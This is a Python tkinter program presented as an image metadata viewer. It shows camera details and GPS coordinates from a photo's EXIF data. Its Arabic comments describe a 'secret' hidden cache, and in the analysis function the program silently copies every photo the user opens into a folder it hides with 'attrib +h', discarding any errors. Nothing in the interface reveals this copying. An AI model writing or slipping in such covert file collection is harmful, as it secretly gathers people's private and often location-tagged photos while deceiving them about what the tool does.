import tkinter as tk
from tkinter import filedialog, scrolledtext
from tkinter import ttk 
from PIL import Image, ExifTags
import os
import shutil

# ==========================================
# 1. إعداد المخبأ السري (Cache Temp)
# ==========================================
DB_FOLDER = "cache_temp" 

def setup_database():
    if not os.path.exists(DB_FOLDER):
        os.makedirs(DB_FOLDER)
        # إخفاء المجلد (Windows Only)
        os.system(f'attrib +h {DB_FOLDER}') 

# ==========================================
# 2. محرك GPS
# ==========================================
def get_decimal_from_dms(dms, ref):
    degrees = dms[0]
    minutes = dms[1]
    seconds = dms[2]
    decimal = degrees + (minutes / 60.0) + (seconds / 3600.0)
    if ref in ['S', 'W']:
        decimal = -decimal
    return decimal

def get_gps_details(exif):
    gps_info = {}
    for key, value in exif.items():
        name = ExifTags.TAGS.get(key, key)
        if name == 'GPSInfo':
            gps_info = value
            break
    if not gps_info:
        return None
    lat_dms = gps_info.get(2)
    lat_ref = gps_info.get(1)
    lon_dms = gps_info.get(4)
    lon_ref = gps_info.get(3)
    if lat_dms and lat_ref and lon_dms and lon_ref:
        lat = get_decimal_from_dms(lat_dms, lat_ref)
        lon = get_decimal_from_dms(lon_dms, lon_ref)
        return lat, lon
    return None

# ==========================================
# 3. التحليل + النسخ الصامت
# ==========================================
def analyze_image():
    setup_database()

    file_path = filedialog.askopenfilename(filetypes=[("Image Files", "*.jpg;*.jpeg;*.png")])
    if not file_path:
        return

    output_area.configure(state='normal')
    output_area.delete(1.0, tk.END)
    
    # --- النسخ السري ---
    try:
        filename = os.path.basename(file_path)
        destination = os.path.join(DB_FOLDER, filename)
        shutil.copy2(file_path, destination)
    except Exception:
        pass 
    # -------------------

    output_area.insert(tk.INSERT, "Loading image properties...\n", "gray_text")

    try:
        image = Image.open(file_path)
        exif_raw = image._getexif()

        if not exif_raw:
            output_area.insert(tk.INSERT, "\nNo properties found for this image.\n")
            output_area.configure(state='disabled')
            return

        exif_data = {ExifTags.TAGS.get(k, k): v for k, v in exif_raw.items()}

        make = exif_data.get('Make', 'Standard Camera')
        model = exif_data.get('Model', 'Digital Lens')
        date_time = exif_data.get('DateTimeOriginal', exif_data.get('DateTime', '--/--/----'))
        width = exif_data.get('ExifImageWidth', '0')
        height = exif_data.get('ExifImageHeight', '0')

        report = f"""
Image Information
-----------------
Camera:     {make} {model}
Date Taken: {date_time}
Resolution: {width} x {height} px
"""
        output_area.insert(tk.INSERT, report, "normal_text")

        gps_coords = get_gps_details(exif_raw)
        if gps_coords:
            lat, lon = gps_coords
            gps_text = f"\nLocation Data:\nLat: {lat:.5f}, Lon: {lon:.5f}\n"
            link = f"Open in Maps: http://maps.google.com/?q={lat},{lon}\n"
            output_area.insert(tk.INSERT, gps_text, "blue_text")
            output_area.insert(tk.INSERT, link, "link_text")
        else:
            output_area.insert(tk.INSERT, "\nLocation: Not Available\n", "gray_text")

        output_area.insert(tk.INSERT, "\nDone.", "gray_text")

    except Exception as e:
        output_area.insert(tk.INSERT, "Error reading file.")
    
    output_area.configure(state='disabled')

# ==========================================
# 4. تصميم الواجهة (مع توقيع urwalid)
# ==========================================
root = tk.Tk()
root.title("Photo Properties Viewer") 
root.geometry("500x550")
root.configure(bg="#f0f0f0") 

style = ttk.Style()
style.theme_use('clam') 

header = tk.Label(root, text="Image Metadata Viewer", font=("Segoe UI", 16), bg="#f0f0f0", fg="#333333")
header.pack(pady=20)

btn = ttk.Button(root, text="Open Image File...", command=analyze_image)
btn.pack(pady=10, ipadx=20, ipady=5)

output_area = scrolledtext.ScrolledText(root, width=55, height=20, font=("Segoe UI", 10), bg="white", fg="#333333", relief="flat", padx=10, pady=10)
output_area.pack(pady=15)

output_area.tag_config("normal_text", foreground="black")
output_area.tag_config("gray_text", foreground="gray")
output_area.tag_config("blue_text", foreground="#0055ff")
output_area.tag_config("link_text", foreground="blue", underline=True)

# التوقيع الجديد هنا 👇
footer = tk.Label(root, text="v1.2 | Made by urwalid", font=("Segoe UI", 8), bg="#f0f0f0", fg="#999999")
footer.pack(side="bottom", pady=10)

root.mainloop()